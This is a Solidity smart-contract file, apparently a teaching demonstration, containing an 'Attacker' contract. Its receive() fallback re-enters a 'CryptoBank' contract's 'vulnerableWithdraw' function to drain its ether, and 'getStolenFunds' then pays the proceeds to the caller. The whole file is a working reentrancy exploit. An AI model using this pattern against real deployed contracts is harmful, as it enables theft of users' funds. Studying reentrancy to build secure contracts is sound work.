// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.24;

import "./CryptoBank.sol";

contract Attacker {
   CryptoBank cryptoBank;
   constructor(address payable targetContract_) {
      cryptoBank = CryptoBank(targetContract_);
   }
   function attack(uint256 amount) external {
      cryptoBank.deposit{value: amount}();
      cryptoBank.vulnerableWithdraw(amount);
   }

   function getStolenFunds() external {
      (bool success, ) =  msg.sender.call{value: address(this).balance}("");
      require(success, "Failed"); 
   }
    receive() external payable {
        if (address(cryptoBank).balance > 2.01 ether){
             cryptoBank.vulnerableWithdraw(2 ether);
        }
    }
}